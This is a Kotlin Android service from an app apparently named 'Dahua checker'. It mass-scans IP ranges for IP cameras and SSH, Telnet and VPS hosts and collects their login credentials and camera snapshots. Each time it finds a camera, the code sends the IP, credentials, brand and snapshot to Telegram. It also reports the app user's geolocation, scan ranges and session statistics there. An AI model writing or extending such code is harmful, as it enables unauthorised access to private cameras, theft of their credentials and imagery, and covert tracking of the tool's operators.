package com.dahua.checker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.StateFlow

class ScanService : Service() {

    companion object {
        const val CHANNEL_ID = "dahua_scan"
        const val CHANNEL_FOUND_ID = "camera_found"
        const val NOTIFICATION_ID = 1
        const val ACTION_START = "START_SCAN"
        const val ACTION_STOP = "STOP_SCAN"
        const val EXTRA_PORT = "port"
        const val EXTRA_MULTI_PORT = "multi_port"
        const val EXTRA_SELECTED_PORTS = "selected_ports"
        const val EXTRA_PLUGIN_ID = "plugin_id"
        const val EXTRA_PLUGIN_PORTS = "plugin_ports"

        // Передаём IP через static чтобы избежать TransactionTooLargeException
        @Volatile
        var pendingIps: List<String>? = null
    }

    inner class ScanBinder : Binder() {
        fun getService(): ScanService = this@ScanService
    }

    private val binder = ScanBinder()
    private var scanner: DahuaScanner? = null
    private var scanJob: Job? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)

    private val _progress = MutableStateFlow<ScanProgress?>(null)
    val progress: StateFlow<ScanProgress?> = _progress

    private val _results = MutableSharedFlow<ScanResult>(extraBufferCapacity = 256)
    val results: SharedFlow<ScanResult> = _results

    private val _isScanning = MutableStateFlow(false)
    val isScanning: StateFlow<Boolean> = _isScanning

    // Лог последних строк (max 500) — UI читает это
    private val _logLines = MutableStateFlow<List<String>>(emptyList())
    val logLines: StateFlow<List<String>> = _logLines

    private fun appendLog(line: String) {
        val cur = _logLines.value
        _logLines.value = if (cur.size >= 500) cur.drop(1) + line else cur + line
        // Дублируем последнюю строку в ScanProgress для компактного отображения
        _progress.value = _progress.value?.copy(lastLogLine = line)
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        TelegramReporter.installCrashHandler(this)
    }

    override fun onBind(intent: Intent?): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val ips = pendingIps ?: return START_NOT_STICKY
                pendingIps = null
                val port = intent.getIntExtra(EXTRA_PORT, DahuaScanner.DEFAULT_PORT)
                val multiPort = intent.getBooleanExtra(EXTRA_MULTI_PORT, false)
                val selectedPorts = intent.getIntArrayExtra(EXTRA_SELECTED_PORTS)?.toList()
                val pluginId = intent.getStringExtra(EXTRA_PLUGIN_ID)
                val pluginPorts = intent.getIntArrayExtra(EXTRA_PLUGIN_PORTS)?.toList()
                startScan(ips, port, multiPort, selectedPorts, pluginId, pluginPorts)
            }
            ACTION_STOP -> {
                stopScan()
            }
        }
        return START_NOT_STICKY
    }

    private fun startScan(ips: List<String>, port: Int, multiPort: Boolean, selectedPorts: List<Int>? = null, pluginId: String? = null, pluginPorts: List<Int>? = null) {
        if (_isScanning.value) return

        // Гарантируем что плагины загружены (если ScanService стартует без MainActivity)
        PluginManager.init(this)

        // Репорт геолокации + старт сессии
        val nickname = AuthManager.getActiveNickname(this)
        val activePorts = selectedPorts ?: pluginPorts ?: listOf(port)
        val ipRanges = ips.take(20) // первые 20 для превью
        TelegramReporter.reportLocation(this, nickname)
        TelegramReporter.reportScanStarted(nickname, ips.size, activePorts, ipRanges)

        val notification = buildNotification("Сканирование...", 0, 0)
        try {
            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            // На некоторых устройствах startForeground может упасть
            // если нет разрешения на уведомления — продолжаем без foreground
        }
        acquireWakeLock()

        _isScanning.value = true
        _progress.value = ScanProgress(ips.size, 0, 0, 0, 0)
        _logLines.value = emptyList()

        val s = DahuaScanner()
        scanner = s
        // Подключаем лог-коллбэк — вызывается из IO-потоков, безопасно
        s.onLogLine = { line -> appendLog(line) }

        scanJob = scope.launch {
            try {
                val onResult: suspend (ScanResult) -> Unit = { r ->
                    _results.emit(r)
                    // Push-уведомление при нахождении камеры (не терминала)
                    if (!r.blocked && r.brand !in setOf("SSH-TTY", "Telnet-TTY", "VPS")) {
                        notifyCameraFound(r)
                        // Репорт в Telegram — IP, креды, бренд
                        TelegramReporter.reportCameraFound(nickname, r)
                        // Снапшот JPEG — если есть, шлём фото
                        if (r.snapshot != null && r.snapshot.isNotEmpty()) {
                            TelegramReporter.reportSnapshot(this@ScanService, nickname, r, r.snapshot)
                        }
                    }
                }
                val onProgress: suspend (ScanProgress) -> Unit = { p ->
                    _progress.value = p
                    updateNotification(p)
                    if (p.finished) {
                        // Итоговая статистика сессии
                        TelegramReporter.reportSessionFinished(
                            nickname, p.total, p.successful, p.blocked, p.openPorts
                        )
                        _isScanning.value = false
                        releaseWakeLock()
                        stopForeground(STOP_FOREGROUND_DETACH)
                        stopSelf()
                    } else if (p.cancelled) {
                        TelegramReporter.reportScanStopped(nickname, p.checked, p.total, p.successful)
                        _isScanning.value = false
                        releaseWakeLock()
                        stopForeground(STOP_FOREGROUND_DETACH)
                        stopSelf()
                    }
                }

                if (pluginId != null) {
                    // Пользователь явно выбрал плагин в UI
                    val plugin = PluginManager.getPlugins().find { it.id == pluginId }
                    if (plugin != null) {
                        s.scanWithPlugin(plugin, ips, onResult, onProgress, pluginPorts)
                    } else {
                        s.scan(ips, port, onResult, onProgress)
                    }
                } else if (selectedPorts != null && selectedPorts.isNotEmpty()) {
                    // Выбранные порты — нативный скан (без автоматического плагина)
                    s.scanSelectedPorts(ips, selectedPorts, onResult, onProgress)
                } else if (multiPort) {
                    // Мульти-порт — нативный скан
                    s.scanMultiPort(ips, onResult, onProgress)
                } else {
                    // Одиночный порт — нативный скан
                    s.scan(ips, port, onResult, onProgress)
                }
            } catch (ce: CancellationException) {
                throw ce
            } catch (_: Exception) {
                _isScanning.value = false
                releaseWakeLock()
                stopForeground(STOP_FOREGROUND_DETACH)
                stopSelf()
            }
        }
    }

    fun stopScan() {
        scanner?.cancelled = true
        scanJob?.cancel()          // убиваем все корутины сразу
        _isScanning.value = false
        releaseWakeLock()
        try {
            stopForeground(STOP_FOREGROUND_DETACH)
        } catch (_: Exception) {}
        stopSelf()
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DahuaChecker::ScanWakeLock")
        wakeLock?.acquire(3 * 60 * 60 * 1000L)  // 3 часа для длинных сканов
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
        } catch (_: Exception) {}
        wakeLock = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            // Основной канал (тихий, для progress)
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Main Scanner",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Сканирование камер"
                setShowBadge(false)
            }
            nm.createNotificationChannel(channel)

            // Канал для найденных камер (HIGH — со звуком и badge)
            val foundChannel = NotificationChannel(
                CHANNEL_FOUND_ID,
                "Найдена камера",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Уведомление при обнаружении камеры"
                setShowBadge(true)
                enableVibration(true)
            }
            nm.createNotificationChannel(foundChannel)
        }
    }

    private var foundNotifId = 100

    fun notifyCameraFound(result: ScanResult) {
        val launchIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, launchIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val creds = if (result.login.isNotEmpty()) "${result.login}:${result.password}" else "anonymous"
        val text = "[${result.brand}] ${result.ip}:${result.port} — $creds"
        val notification = NotificationCompat.Builder(this, CHANNEL_FOUND_ID)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("📷 Камера найдена!")
            .setContentText(text)
            .setStyle(NotificationCompat.BigTextStyle().bigText(text))
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .build()
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(foundNotifId++, notification)
    }

    private fun buildNotification(text: String, checked: Int, total: Int): Notification {
        val launchIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, launchIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val stopIntent = Intent(this, ScanService::class.java).apply {
            action = ACTION_STOP
        }
        val stopPending = PendingIntent.getService(
            this, 1, stopIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_search)
            .setContentTitle("Main Scanner")
            .setContentText(text)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .addAction(android.R.drawable.ic_media_pause, "Стоп", stopPending)

        if (total > 0) {
            builder.setProgress(total, checked, false)
        }
        return builder.build()
    }

    private fun updateNotification(p: ScanProgress) {
        val text = if (p.finished) {
            "Завершено: ${p.successful} найдено, ${p.blocked} заблокировано"
        } else if (p.cancelled) {
            "Отменено: ${p.checked}/${p.total}"
        } else {
            "${p.checked}/${p.total} | Найдено: ${p.successful} | Порты: ${p.openPorts}"
        }
        val notification = buildNotification(text, p.checked, p.total)
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(NOTIFICATION_ID, notification)
    }

    override fun onDestroy() {
        scanJob?.cancel()
        releaseWakeLock()
        scope.cancel()
        super.onDestroy()
    }
}
